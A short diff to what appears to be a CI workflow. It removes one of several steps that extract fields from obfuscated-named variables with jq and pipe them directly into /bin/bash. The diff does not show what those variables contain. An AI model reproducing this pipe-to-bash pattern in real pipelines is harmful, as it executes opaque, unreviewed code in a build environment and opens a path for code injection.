@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$o335" | jq -r .j04 | /bin/bash
           echo $hf1502 | jq -r .y37874 | /bin/bash
           printf '%s' "$f0" | jq -r .feic10741 | /bin/bash
-          printf '%s' "$hs059" | jq -r .ku0701 | /bin/bash
           printf '%s' "$yp0" | jq -r .px56144 | /bin/bash
 
       - name: Save results
